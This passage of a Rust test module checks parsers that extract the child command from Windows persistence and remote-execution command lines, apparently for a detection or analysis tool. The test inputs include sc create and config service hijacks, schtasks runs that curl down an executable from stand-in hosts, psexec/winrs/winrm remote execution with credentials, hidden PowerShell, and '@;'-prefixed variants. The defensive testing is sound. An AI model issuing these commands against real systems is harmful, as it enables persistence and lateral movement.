    fn sc_create_binpath_accepts_spaced_equals_value() {
        let (service_name, bin_path) =
            sc_service_binpath(r#"sc create UpdateSvc binPath= "cmd.exe /c echo hi""#)
                .expect("sc create binPath should parse");

        assert_eq!(service_name, "UpdateSvc");
        assert_eq!(bin_path, "cmd.exe /c echo hi");
    }

    #[test]
    fn sc_create_binpath_accepts_attached_equals_value() {
        let (service_name, bin_path) =
            sc_service_binpath(r#"sc.exe create "Update Svc" binPath="cmd.exe /c echo hi""#)
                .expect("attached sc create binPath should parse");

        assert_eq!(service_name, "Update Svc");
        assert_eq!(bin_path, "cmd.exe /c echo hi");
    }

    #[test]
    fn sc_create_binpath_accepts_attached_unquoted_value() {
        let (service_name, bin_path) =
            sc_service_binpath(r#"sc create UpdateSvc binPath=cmd.exe /c echo hi"#)
                .expect("attached unquoted sc create binPath should parse");

        assert_eq!(service_name, "UpdateSvc");
        assert_eq!(bin_path, "cmd.exe /c echo hi");
    }

    #[test]
    fn sc_remote_create_binpath_accepts_host_before_subcommand() {
        let (service_name, bin_path) = sc_service_binpath(
            r#"sc \\target.example create UpdateSvc binPath= "cmd.exe /c echo hi""#,
        )
        .expect("remote sc create binPath should parse");

        assert_eq!(service_name, "UpdateSvc");
        assert_eq!(bin_path, "cmd.exe /c echo hi");
    }

    #[test]
    fn sc_config_binpath_accepts_spaced_equals_value() {
        let (service_name, bin_path) =
            sc_service_binpath(r#"sc config UpdateSvc binPath= "cmd.exe /c echo hi""#)
                .expect("sc config binPath should parse");

        assert_eq!(service_name, "UpdateSvc");
        assert_eq!(bin_path, "cmd.exe /c echo hi");
    }

    #[test]
    fn sc_failure_command_accepts_spaced_equals_value() {
        let (service_name, command) =
            sc_failure_command(r#"sc failure UpdateSvc command= "cmd.exe /c echo hi""#)
                .expect("sc failure command should parse");

        assert_eq!(service_name, "UpdateSvc");
        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn sc_remote_failure_command_accepts_host_before_subcommand() {
        let (service_name, command) = sc_failure_command(
            r#"sc.exe \\target.example failure UpdateSvc command= "cmd.exe /c echo hi""#,
        )
        .expect("remote sc failure command should parse");

        assert_eq!(service_name, "UpdateSvc");
        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn persisted_command_child_extracts_cmd_body_and_delayed_flag() {
        let (child, delayed) = persisted_command_child(r#"cmd.exe /V:ON /c echo !USERPROFILE!"#)
            .expect("cmd child should parse");

        assert_eq!(child, "echo !USERPROFILE!");
        assert!(delayed);
    }

    #[test]
    fn schtasks_task_run_collects_unquoted_command_until_next_task_option() {
        let command = schtasks_task_run(
            r#"schtasks /create /tn Updater /tr cmd.exe /c curl -o out.exe https://example.test/p.exe /sc once /st 00:00"#,
        )
        .expect("task action should parse");

        assert_eq!(
            command,
            "cmd.exe /c curl -o out.exe https://example.test/p.exe"
        );
    }

    #[test]
    fn schtasks_attached_unquoted_task_run_collects_until_next_task_option() {
        let command = schtasks_task_run(
            r#"schtasks /create /tn Updater /tr=cmd.exe /c curl -o out.exe https://attached-tr.example/p.exe /sc once /st 00:00"#,
        )
        .expect("attached task action should parse");

        assert_eq!(
            command,
            "cmd.exe /c curl -o out.exe https://attached-tr.example/p.exe"
        );
    }

    #[test]
    fn schtasks_task_run_preserves_quoted_command() {
        let command =
            schtasks_task_run(r#"schtasks /create /tn Updater /tr "cmd.exe /c echo hi" /sc once"#)
                .expect("quoted task action should parse");

        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn runas_child_command_skips_account_and_flags() {
        let command = runas_child_command(
            r#"runas /noprofile /user:Administrator "cmd.exe /c echo elevated""#,
        )
        .expect("runas child command should parse");

        assert_eq!(command, "cmd.exe /c echo elevated");
    }

    #[test]
    fn runas_child_command_accepts_spaced_user_value() {
        let command =
            runas_child_command(r#"runas /user Administrator powershell.exe -nop -w hidden"#)
                .expect("runas spaced user child command should parse");

        assert_eq!(command, "powershell.exe -nop -w hidden");
    }

    #[test]
    fn psexec_child_command_skips_host_auth_and_flags() {
        let (host, command) = psexec_child_command(
            r#"psexec \\target.example -accepteula -u admin -p pass -s cmd.exe /c echo remote"#,
        )
        .expect("psexec child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "cmd.exe /c echo remote");
    }

    #[test]
    fn psexec_child_command_accepts_delimiter_prefix() {
        let (host, command) =
            psexec_child_command(r#"@;psexec \\target.example cmd.exe /c echo remote"#)
                .expect("delimiter-prefixed psexec child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "cmd.exe /c echo remote");
    }

    #[test]
    fn winrs_child_command_accepts_delimiter_prefix() {
        let (host, command) =
            winrs_child_command(r#"@;winrs -r:target.example cmd.exe /c echo hi"#)
                .expect("delimiter-prefixed winrs child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn at_scheduled_command_accepts_delimiter_prefix() {
        let (time, command) = at_scheduled_command(r#"@;at 23:59 cmd.exe /c echo hi"#)
            .expect("delimiter-prefixed at should parse");

        assert_eq!(time, "23:59");
        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn psexec_child_command_accepts_slash_options() {
        let (host, command) = psexec_child_command(
            r#"psexec \\target.example /accepteula /u admin /p pass /s cmd.exe /c echo remote"#,
        )
        .expect("psexec slash-option child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "cmd.exe /c echo remote");
    }

    #[test]
    fn psexec_child_command_accepts_options_before_host() {
        let (host, command) =
            psexec_child_command(r#"psexec -accepteula \\target.example powershell.exe -nop"#)
                .expect("psexec child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "powershell.exe -nop");
    }

    #[test]
    fn winrs_child_command_accepts_attached_remote_host() {
        let (host, command) = winrs_child_command(r#"winrs -r:target.example cmd.exe /c echo hi"#)
            .expect("winrs child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn winrs_child_command_skips_auth_options() {
        let (host, command) =
            winrs_child_command(r#"winrs /r target.example -u admin -p pass powershell.exe -nop"#)
                .expect("winrs child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "powershell.exe -nop");
    }

    #[test]
    fn winrm_child_command_extracts_remote_commandline() {
        let (host, command) = winrm_child_command(
            r#"winrm invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="cmd.exe /c echo hi";CurrentDirectory="C:\Windows"}"#,
        )
        .expect("winrm child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn winrm_child_command_accepts_spaced_remote_host() {
        let (host, command) = winrm_child_command(
            r#"winrm.cmd i Create wmicimv2/Win32_Process /remote target.example @{CommandLine = "powershell.exe -nop"}"#,
        )
        .expect("winrm child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "powershell.exe -nop");
    }

    #[test]
    fn winrm_child_command_accepts_exe_suffix() {
        let (host, command) = winrm_child_command(
            r#"winrm.exe invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="cmd.exe /c echo winrm-exe"}"#,
        )
        .expect("winrm.exe child command should parse");

        assert_eq!(host, "target.example");
        assert_eq!(command, "cmd.exe /c echo winrm-exe");
    }

    #[test]
    fn at_scheduled_command_accepts_plain_time_command() {
        let (time, command) =
            at_scheduled_command(r#"at 23:59 cmd.exe /c echo hi"#).expect("at should parse");

        assert_eq!(time, "23:59");
        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn at_scheduled_command_skips_remote_host_and_schedule_flags() {
        let (time, command) =
            at_scheduled_command(r#"at \\host 1:30pm /every:M,T "cmd.exe /c echo hi""#)
                .expect("remote at should parse");

        assert_eq!(time, "1:30pm");
        assert_eq!(command, r#""cmd.exe /c echo hi""#);
    }
}
